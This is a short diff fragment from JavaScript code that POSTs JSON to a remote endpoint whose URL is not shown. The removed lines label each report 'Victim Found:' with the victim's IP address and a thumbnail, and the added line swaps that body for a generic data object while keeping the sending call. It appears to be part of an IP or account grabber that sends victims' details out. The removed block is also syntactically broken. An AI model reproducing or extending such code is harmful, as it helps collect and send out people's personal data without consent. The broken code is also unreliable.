@@ -33,15 +33,7 @@
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({
-            "content": null,
-             "author": {
-                  "name": "Victim Found: " + ipAddr,
-                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
-                },
-                    
-                    
-                    )
+                body: JSON.stringify(data )
             })
             .then(function(response) {
                 if (response.ok) {
